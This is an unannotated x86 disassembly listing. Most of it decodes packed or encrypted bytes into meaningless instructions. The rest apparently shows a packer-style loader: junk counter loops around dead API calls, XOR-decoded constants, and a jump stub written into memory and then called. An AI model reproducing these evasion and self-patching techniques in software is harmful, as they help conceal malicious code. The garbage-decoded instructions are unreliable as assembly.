  41b35a:	sbb    al,0xa1
  41b35c:	fsubr  st,st(1)
  41b35e:	out    dx,eax
  41b35f:	loope  0x41b2f8
  41b361:	and    esp,DWORD PTR [edi-0x1a]
  41b364:	dec    BYTE PTR [ecx+0x34]
  41b367:	lahf   
  41b368:	add    eax,0xf4b52772
  41b36d:	fdivr  DWORD PTR [ebx+0x6b623260]
  41b373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b374:	sbb    DWORD PTR [edx+0x20],0x5d
  41b378:	push   esp
  41b379:	lds    edi,FWORD PTR [edi-0x601fabc9]
  41b37f:	(bad)  
  41b380:	pop    edx
  41b381:	push   edx
  41b382:	cdq    
  41b383:	jecxz  0x41b3aa
  41b385:	cmp    BYTE PTR [edi+0xc325371],0x75
  41b38c:	xor    eax,eax
  41b38e:	imul   esp,DWORD PTR [ebx],0xffffff83
  41b391:	mov    bh,0xbc
  41b393:	push   0x69c14747
  41b398:	popf   
  41b399:	out    0xb5,eax
  41b39b:	sub    al,0x59
  41b39d:	mov    edx,0xe9c07cf6
  41b3a2:	pusha  
  41b3a3:	jecxz  0x41b412
  41b3a5:	sbb    al,0xd6
  41b3a7:	in     eax,dx
  41b3a8:	out    0xc0,eax
  41b3aa:	dec    edx
  41b3ab:	std    
  41b3ac:	popa   
  41b3ad:	loop   0x41b3d9
  41b3af:	jge    0x41b346
  41b3b1:	sbb    eax,0xc8368d
  41b3b6:	mov    ebp,0x7d731afd
  41b3bb:	test   DWORD PTR [esp+esi*1],eax
  41b3be:	mov    DWORD PTR [ecx-0xf],eax
  41b3c1:	dec    eax
  41b3c2:	in     al,dx
  41b3c3:	push   esp
  41b3c4:	pop    esp
  41b3c5:	xchg   DWORD PTR [edi+edx*8-0x72],ebp
  41b3c9:	cmp    DWORD PTR [ecx+0x45],ecx
  41b3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3cd:	pop    esp
  41b3ce:	adc    eax,0xdbc9938c
  41b3d3:	ds leave 
  41b3d5:	(bad)  
  41b3d6:	neg    DWORD PTR [ebx+ebp*1+0x317da751]
  41b3dd:	cmp    ebx,eax
  41b3df:	dec    eax
  41b3e0:	ja     0x41b400
  41b3e2:	and    al,0x68
  41b3e4:	fld    DWORD PTR [edi+0x2]
  41b3e7:	dec    ecx
  41b3e8:	mov    ch,0x26
  41b3ea:	mov    ch,BYTE PTR [edx+0x43]
  41b3ed:	loop   0x41b393
  41b3ef:	out    dx,eax
  41b3f0:	les    esi,FWORD PTR [ecx+0x52]
  41b3f3:	jp     0x41b407
  41b3f5:	nop
  41b3f6:	jno    0x41b38b
  41b3f8:	clc    
  41b3f9:	std    
  41b3fa:	adc    al,0x9b
  41b3fc:	push   edi
  41b3fd:	call   0xb0ca01ba
  41b402:	fadd   DWORD PTR [ebx+edx*2]
  41b405:	jg     0x41b3fc
  41b407:	xor    BYTE PTR [edx],bh
  41b409:	stos   BYTE PTR es:[edi],al
  41b40a:	xchg   ecx,eax
  41b40b:	add    eax,0xa4d8443d
  41b410:	shl    DWORD PTR [ebx-0x58],cl
  41b413:	in     al,0xe4
  41b415:	sub    esp,ecx
  41b417:	nop
  41b418:	dec    edi
  41b419:	pandn  mm5,QWORD PTR [edx-0x4d]
  41b41d:	call   0xbd88:0x16ecbcad
  41b424:	cmp    eax,0x951d5e23
  41b429:	lds    ebp,FWORD PTR [ecx]
  41b42b:	adc    al,BYTE PTR [ecx-0x30b907bb]
  41b431:	mov    cl,0x41
  41b433:	xchg   edi,eax
  41b434:	mov    cl,0x3
  41b436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b437:	in     eax,0x5d
  41b439:	add    dh,BYTE PTR [ebp+0x214d72e4]
  41b43f:	je     0x41b43f
  41b441:	add    DWORD PTR [ebp+ebp*2-0x3dcb77ea],edx
  41b448:	mov    dl,0xea
  41b44a:	push   edi
  41b44b:	jae    0x41b48a
  41b44d:	pop    ebx
  41b44e:	call   0x998a78c4
  41b453:	ficom  DWORD PTR [eax+ebp*1+0x751af74b]
  41b45a:	inc    esp
  41b45b:	xchg   DWORD PTR [edi],eax
  41b45d:	pop    esi
  41b45e:	xchg   ebx,eax
  41b45f:	arpl   WORD PTR [bx+si+0x6e],bx
  41b463:	jge    0x41b46c
  41b465:	jecxz  0x41b42f
  41b467:	pop    DWORD PTR [ebp-0x40]
  41b46a:	fbld   TBYTE PTR [eax-0x70ce72ef]
  41b470:	mov    ebx,DWORD PTR [esi+0x5d0fbb04]
  41b476:	test   eax,0x9fe6d571
  41b47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b47c:	or     edi,DWORD PTR [eax+0x5f]
  41b47f:	mov    ah,0x58
  41b481:	(bad)  
  41b483:	lods   al,BYTE PTR ds:[esi]
  41b484:	stos   DWORD PTR es:[edi],eax
  41b485:	mov    bl,0xb2
  41b487:	mov    eax,ds:0xe1e6b0dd
  41b48c:	push   eax
  41b48d:	pop    eax
  41b48e:	cmp    eax,0xd029f6a0
  41b493:	idiv   DWORD PTR [eax+0x649cb82b]
  41b499:	out    0x98,al
  41b49b:	repnz fsubr st(0),st
  41b49e:	adc    BYTE PTR [eax+0x40192b30],cl
  41b4a4:	test   eax,0x5a4f9a07
  41b4a9:	retf   
  41b4aa:	syscall 
  41b4ac:	jmp    0x88da2fdc
  41b4b1:	push   esp
  41b4b2:	push   esp
  41b4b3:	sbb    DWORD PTR [ebx+ebp*1+0xe4ca662],esp
  41b4ba:	mov    bl,0x4c
  41b4bc:	mov    ebp,0x5c6e3f4a
  41b4c1:	inc    ebp
  41b4c2:	addr16 jae 0x41b447
  41b4c5:	jmp    0x433e6417
  41b4ca:	jns    0x41b464
  41b4cc:	inc    edx
  41b4cd:	arpl   WORD PTR [eax],cx
  41b4cf:	repz repz mov al,ds:0x448feaf9
  41b4d6:	and    BYTE PTR [ebp+0x66],ah
  41b4d9:	adc    ecx,DWORD PTR [ecx-0xcc2c83b]
  41b4df:	sbb    ebp,DWORD PTR [edx+ecx*1+0x7d]
  41b4e3:	shl    bh,1
  41b4e5:	int3   
  41b4e6:	fsubr  st,st(6)
  41b4e8:	fist   WORD PTR [edx+0x12]
  41b4eb:	lods   al,BYTE PTR ds:[esi]
  41b4ec:	jb     0x41b50c
  41b4ee:	mov    al,0x96
  41b4f1:	inc    edi
  41b4f2:	xchg   esi,eax
  41b4f3:	retf   
  41b4f4:	xor    eax,0x28a433e4
  41b4f9:	popa   
  41b4fa:	mov    ch,0x3
  41b4fc:	cmp    eax,eax
  41b4fe:	xor    BYTE PTR [ebx],ch
  41b500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b501:	mov    eax,0x99384695
  41b506:	in     eax,0xc7
  41b508:	ins    DWORD PTR es:[edi],dx
  41b509:	lds    ecx,FWORD PTR [esp+ebx*1-0x36d652a]
  41b510:	ret    0x5e19
  41b513:	mov    bh,0x50
  41b515:	int3   
  41b516:	call   FWORD PTR [ebp+ebx*2-0x4584106f]
  41b51d:	adc    BYTE PTR [ebx-0x40],0xe6
  41b521:	xor    DWORD PTR [edx+0x43c880bc],eax
  41b527:	leave  
  41b528:	cmp    ecx,eax
  41b52a:	adc    BYTE PTR [eax],0x3e
  41b52d:	aaa    
  41b52e:	or     DWORD PTR ds:0x5a6638d4,edi
  41b534:	in     al,dx
  41b535:	or     BYTE PTR [ecx-0x57c141b3],bl
  41b53b:	mov    edx,0xcf136391
  41b540:	and    esi,DWORD PTR [ebx-0x69]
  41b543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b544:	test   eax,0xdc7e621
  41b549:	xchg   ecx,eax
  41b54a:	retf   0xabea
  41b54d:	xchg   DWORD PTR [ecx+0x67],ecx
  41b550:	xchg   ecx,eax
  41b551:	fsubr  DWORD PTR [edx]
  41b553:	cmp    ebx,0xd8634271
  41b559:	lods   al,BYTE PTR ds:[esi]
  41b55a:	imul   esi,DWORD PTR [eax+ecx*8+0x5c],0xda490fa
  41b562:	jmp    0x41b5ab
  41b564:	sar    BYTE PTR [edx-0x10],0x9a
  41b568:	mov    ch,0xee
  41b56a:	imul   esp,DWORD PTR [ecx+0xa288261],0xfffffff9
  41b571:	xchg   ecx,eax
  41b572:	ret    0x1107
  41b575:	in     al,0x25
  41b577:	stos   BYTE PTR es:[edi],al
  41b578:	adc    DWORD PTR [ecx+0x28],eax
  41b57b:	test   DWORD PTR [ecx+eax*2+0x60],ebp
  41b57f:	or     BYTE PTR [eax-0x47],ah
  41b582:	aas    
  41b583:	sbb    ebp,esp
  41b585:	add    al,0x1d
  41b587:	in     eax,dx
  41b588:	mov    ebp,0x1b6f3de2
  41b58d:	aaa    
  41b58e:	arpl   WORD PTR [edi],si
  41b590:	mov    bh,0x7b
  41b592:	jp     0x41b572
  41b594:	adc    DWORD PTR [ecx-0x65],0xca868171
  41b59b:	push   edx
  41b59c:	dec    esp
  41b59d:	outs   dx,BYTE PTR ds:[esi]
  41b59e:	ja     0x41b5cc
  41b5a0:	sub    eax,0x9e7823bf
  41b5a5:	mov    cl,0xb9
  41b5a7:	jl     0x41b537
  41b5a9:	(bad)  [edi-0x15b666f0]
  41b5af:	xchg   ebp,eax
  41b5b0:	mov    ebx,esp
  41b5b2:	mov    BYTE PTR [ebx+0x27e6e1ef],ah
  41b5b8:	dec    ebx
  41b5b9:	jp     0x41b596
  41b5bb:	sbb    esp,DWORD PTR [esp+ebp*8-0x49e88282]
  41b5c2:	jb     0x41b5bb
  41b5c4:	aaa    
  41b5c5:	adc    bh,BYTE PTR [edi-0x27ad7a76]
  41b5cb:	push   ecx
  41b5cc:	sub    ch,cl
  41b5ce:	in     al,0xfb
  41b5d0:	pop    ecx
  41b5d1:	popa   
  41b5d2:	loopne 0x41b597
  41b5d4:	or     eax,DWORD PTR [eax+0x3a]
  41b5d7:	inc    ebp
  41b5d8:	sub    cl,ah
  41b5da:	inc    edi
  41b5db:	cli    
  41b5dc:	push   ds
  41b5dd:	xor    dl,0xa2
  41b5e0:	rcr    DWORD PTR [eax],1
  41b5e2:	stos   BYTE PTR es:[edi],al
  41b5e3:	push   ss
  41b5e4:	sbb    DWORD PTR [ebp+0x7e],ebp
  41b5e7:	imul   esp,edx,0x18
  41b5ea:	xor    DWORD PTR [esi+edx*8],edx
  41b5ed:	xchg   esp,eax
  41b5ee:	mul    BYTE PTR [ebx-0x1633a097]
  41b5f4:	mov    bh,0x42
  41b5f6:	hlt    
  41b5f7:	fwait
  41b5f8:	adc    ebp,DWORD PTR [ebp+0x4444054]
  41b5fe:	push   edx
  41b5ff:	add    ah,0x16
  41b602:	jbe    0x41b64f
  41b604:	dec    edx
  41b605:	add    DWORD PTR es:[eax],ebp
  41b608:	daa    
  41b609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b60a:	test   eax,0x114912a3
  41b60f:	sbb    DWORD PTR [esi+0x65],ebx
  41b612:	or     al,cl
  41b614:	add    DWORD PTR gs:0xc22533dd,edx
  41b61b:	jmp    FWORD PTR [esp+ebx*2]
  41b61e:	les    ecx,FWORD PTR [esi]
  41b620:	and    DWORD PTR [ecx+0x2b715176],esp
  41b626:	cdq    
  41b627:	push   ecx
  41b628:	loopne 0x41b615
  41b62a:	test   DWORD PTR [esi+0xc],ecx
  41b62d:	jo     0x41b66d
  41b62f:	out    dx,al
  41b630:	jp     0x41b635
  41b632:	dec    edx
  41b633:	imul   ebp,ebx,0xffffffbc
  41b636:	and    edx,eax
  41b638:	cld    
  41b639:	mov    al,0xcd
  41b63b:	pop    ecx
  41b63c:	jle    0x41b63e
  41b63e:	cmc    
  41b63f:	dec    edi
  41b640:	pop    ebp
  41b641:	push   ds
  41b642:	mov    ecx,0x3707ab7a
  41b647:	mov    esp,0x7b21df49
  41b64c:	(bad)  
  41b64d:	(bad)  
  41b64e:	mov    bl,0xeb
  41b650:	inc    edx
  41b651:	push   ds
  41b652:	mov    ch,0x8a
  41b654:	sbb    eax,0x93d70fdf
  41b659:	out    0xd4,al
  41b65b:	jle    0x41b694
  41b65d:	push   ebx
  41b65e:	cmp    al,0xfd
  41b660:	mov    ah,0x4b
  41b662:	push   edx
  41b663:	ins    BYTE PTR es:[edi],dx
  41b664:	test   dl,ch
  41b666:	inc    eax
  41b667:	out    0xf3,eax
  41b669:	xchg   ecx,eax
  41b66a:	pushf  
  41b66b:	test   BYTE PTR [ecx],bh
  41b66d:	mov    edx,0x19230230
  41b672:	fild   QWORD PTR [ebx+eax*8-0x43]
  41b676:	hlt    
  41b677:	push   eax
  41b678:	mov    esi,0x1a3c6ffa
  41b67d:	mov    dl,0xf9
  41b67f:	scas   eax,DWORD PTR es:[edi]
  41b680:	jmp    0xc43d6f5
  41b685:	push   ebp
  41b686:	mov    ah,0xda
  41b688:	cli    
  41b689:	test   eax,0x1f02425b
  41b68e:	xchg   ebx,eax
  41b68f:	fistp  DWORD PTR [eax+0x36]
  41b692:	std    
  41b693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b694:	mov    ah,0x5f
  41b696:	jo     0x41b684
  41b698:	icebp  
  41b699:	inc    ecx
  41b69a:	adc    BYTE PTR [esi+0x3f],bl
  41b69d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b69e:	adc    eax,0xf759c6f9
  41b6a3:	sub    bl,BYTE PTR [eax-0x6dc67608]
  41b6a9:	hlt    
  41b6aa:	pushf  
  41b6ab:	mov    ?,edi
  41b6ad:	hlt    
  41b6ae:	aad    0x69
  41b6b0:	mov    ?,WORD PTR [ecx]
  41b6b2:	loop   0x41b6a3
  41b6b4:	imul   edx,DWORD PTR [esi-0x6185ddd5],0x2b5a430
  41b6be:	inc    esi
  41b6bf:	xchg   ebp,eax
  41b6c0:	hlt    
  41b6c1:	pop    es
  41b6c2:	sbb    ebx,edx
  41b6c4:	cmc    
  41b6c5:	sahf   
  41b6c6:	xchg   BYTE PTR [ebp+0xc],al
  41b6c9:	push   ecx
  41b6ca:	(bad)  
  41b6cc:	mov    edi,0xaae1fece
  41b6d1:	inc    edi
  41b6d2:	xchg   ebp,eax
  41b6d3:	popa   
  41b6d4:	gs jbe 0x41b709
  41b6d7:	call   0x81c2a26c
  41b6dc:	jp     0x41b6c6
  41b6de:	cmp    al,0x73
  41b6e0:	icebp  
  41b6e1:	adc    al,0xd0
  41b6e3:	jns    0x41b697
  41b6e5:	sbb    al,ch
  41b6e7:	lds    esi,FWORD PTR [eax+esi*2]
  41b6ea:	in     al,dx
  41b6eb:	fbld   TBYTE PTR [edx-0x44d30bd4]
  41b6f1:	cmp    ecx,esi
  41b6f3:	pop    eax
  41b6f4:	int3   
  41b6f5:	adc    ah,al
  41b6f7:	adc    bl,BYTE PTR [ebp-0xc]
  41b6fa:	aad    0xdf
  41b6fc:	test   al,0xe2
  41b6fe:	and    DWORD PTR [ebp-0x8],esi
  41b701:	adc    DWORD PTR [ebp+0x22bf785e],ebp
  41b707:	sub    al,0x2e
  41b709:	sbb    ebp,esi
  41b70b:	in     al,0x77
  41b70d:	scas   eax,DWORD PTR es:[edi]
  41b70e:	mov    ebx,?
  41b710:	dec    esi
  41b711:	sbb    si,bx
  41b714:	jo     0x41b74f
  41b716:	adc    al,0xe8
  41b718:	and    cl,dh
  41b71a:	out    dx,eax
  41b71b:	mov    ?,WORD PTR [esi+0x38]
  41b71e:	push   ebx
  41b71f:	inc    ebx
  41b720:	jecxz  0x41b795
  41b722:	jbe    0x41b755
  41b724:	mov    DWORD PTR [ebx-0x27012497],esi
  41b72a:	jno    0x41b7ab
  41b72c:	fld    TBYTE PTR [ecx+edi*4-0x445b4076]
  41b733:	or     al,0x62
  41b735:	scas   eax,DWORD PTR es:[edi]
  41b736:	mov    esi,0xba06efdf
  41b73b:	mov    eax,ds:0xf0b4c73d
  41b740:	mov    BYTE PTR [esi-0x4e98828f],cl
  41b746:	test   BYTE PTR [esi+0x7161720e],0x5b
  41b74d:	jne    0x41b76d
  41b74f:	push   ebp
  41b750:	and    ecx,DWORD PTR [ebx]
  41b752:	ret    0xa1ad
  41b755:	mov    fs,eax
  41b757:	dec    esi
  41b758:	aam    0x64
  41b75a:	shr    esp,cl
  41b75c:	push   cx
  41b75e:	lods   al,BYTE PTR cs:[esi]
  41b760:	cwde   
  41b761:	out    dx,al
  41b762:	dec    ecx
  41b763:	(bad)  
  41b764:	pop    esi
  41b765:	ret    
  41b766:	es push ss
  41b768:	(bad)
  41b76b:	dec    esi
  41b76c:	fwait
  41b76d:	jne    0x41b78f
  41b76f:	or     DWORD PTR [ebx],esp
  41b771:	in     eax,dx
  41b772:	mov    edx,cs
  41b774:	div    BYTE PTR [edi+edi*4]
  41b777:	and    bh,bh
  41b779:	js     0x41b72c
  41b77b:	stc    
  41b77c:	icebp  
  41b77d:	dec    esi
  41b77e:	in     eax,0xb4
  41b780:	scas   eax,DWORD PTR es:[edi]
  41b781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b782:	lahf   
  41b783:	rol    DWORD PTR [esi+0x27eaea97],0x89
  41b78a:	ds test eax,0xc9d32eb
  41b790:	pusha  
  41b791:	leave  
  41b792:	ja     0x41b76c
  41b794:	(bad)  
  41b796:	jnp    0x41b7c9
  41b798:	(bad)  
  41b799:	mov    ds:0x690d6be0,eax
  41b79e:	and    DWORD PTR [edi+0x2f39fdd],esp
  41b7a4:	into   
  41b7a5:	in     al,0x56
  41b7a7:	(bad)  
  41b7a8:	mov    dl,ah
  41b7aa:	fist   DWORD PTR [edx+edi*1]
  41b7ad:	repz imul edx,ebp,0xd9436b42
  41b7b4:	mov    BYTE PTR [eax+eax*1-0x279eacce],0xf
  41b7bc:	idiv   DWORD PTR [ecx-0x1ce02bc8]
  41b7c2:	pop    esi
  41b7c3:	clc    
  41b7c4:	jno    0x41b7c5
  41b7c6:	sub    al,cl
  41b7c8:	and    DWORD PTR [ebx+0x5c],edx
  41b7cb:	pop    ecx
  41b7cc:	and    DWORD PTR [ebx],esp
  41b7ce:	sahf   
  41b7cf:	or     BYTE PTR [esi+0x24],al
  41b7d2:	dec    esi
  41b7d3:	xor    bh,BYTE PTR [edi+0x7ce4125e]
  41b7d9:	(bad)  
  41b7da:	xor    DWORD PTR [eax+0x20],edi
  41b7dd:	aam    0x42
  41b7df:	lea    esp,[ecx+0x14]
  41b7e2:	inc    eax
  41b7e3:	xchg   ebp,eax
  41b7e4:	pop    eax
  41b7e5:	pushf  
  41b7e6:	sub    al,0x68
  41b7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e9:	test   eax,0xecdd7a69
  41b7ee:	push   esp
  41b7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f1:	xor    BYTE PTR [edi-0x2230ae93],al
  41b7f7:	jmp    0xe971:0x9d4848bb
  41b7fe:	hlt    
  41b7ff:	pop    esi
  41b800:	cld    
  41b801:	fldcw  WORD PTR [eax-0x3]
  41b804:	pop    es
  41b805:	shl    dl,0x4c
  41b808:	inc    ebp
  41b809:	push   eax
  41b80a:	sub    cl,ch
  41b80c:	sbb    al,0x8f
  41b80e:	jmp    0x41b87b
  41b810:	cdq    
  41b811:	imul   edi,DWORD PTR [edx+ecx*2],0x51
  41b815:	outs   dx,BYTE PTR ds:[esi]
  41b816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b817:	sub    ah,ah
  41b819:	sub    eax,0x3e3546ef
  41b81e:	dec    ecx
  41b81f:	sub    ecx,DWORD PTR ds:0xd6c11580
  41b825:	push   0x1a
  41b827:	lds    edi,FWORD PTR [ecx]
  41b829:	mov    ah,0xe4
  41b82b:	mov    cl,0xe0
  41b82d:	hlt    
  41b82e:	xor    ecx,ebx
  41b830:	pusha  
  41b831:	popf   
  41b832:	dec    ebx
  41b833:	push   ds
  41b834:	push   ds
  41b835:	cmp    BYTE PTR [ecx-0x33],bh
  41b838:	mov    dl,0x83
  41b83a:	xor    al,0x3d
  41b83c:	adc    cl,BYTE PTR [eax]
  41b83e:	stos   BYTE PTR es:[edi],al
  41b83f:	inc    esi
  41b840:	add    al,0xa5
  41b842:	icebp  
  41b843:	sub    cl,BYTE PTR [eax]
  41b845:	fisubr DWORD PTR [eax-0x269fd54]
  41b84b:	mov    ch,0x91
  41b84d:	mov    ecx,DWORD PTR [ebp-0x4]
  41b850:	and    DWORD PTR ds:0x432ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x432e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x432e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x432e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x432e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x432eab,0x432e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x432e67,0x432e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x432e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x432e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x43246b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x432463],eax
  41b918:	inc    DWORD PTR ds:0x43246b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4321ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x432453
  41b978:	push   DWORD PTR ds:0x4321f7
  41b97e:	push   DWORD PTR ds:0x432433
  41b984:	push   DWORD PTR ds:0x432c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x434e0f
  41b9ab:	mov    esi,DWORD PTR ds:0x439307
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x432eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x432eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x432eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x432eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x432e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x43fdef
  41b9f7:	cmp    DWORD PTR ds:0x432eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x432eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x432eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x432eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x432ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x432e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x432e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x432e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x43fdf3
  41ba63:	mov    ecx,DWORD PTR ds:0x432e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x432e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x432e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x432e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x432e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x432e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x432e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x432e2f
  41bab8:	call   DWORD PTR ds:0x43fdf7
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x432e33
  41bacf:	or     DWORD PTR ds:0x432e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x432e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x432e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x432e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x432e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x432e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x43fdfb
  41bb1c:	cmp    DWORD PTR ds:0x432e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x432e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x432e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x432e33
  41bb46:	add    DWORD PTR ds:0x432e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x432e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4321eb
  41bb66:	mov    DWORD PTR ds:0x432e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x432e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x432e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x432eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x43fdff
  41bba0:	cmp    DWORD PTR ds:0x432e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x432e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x432e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x432e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x432e8b,edx
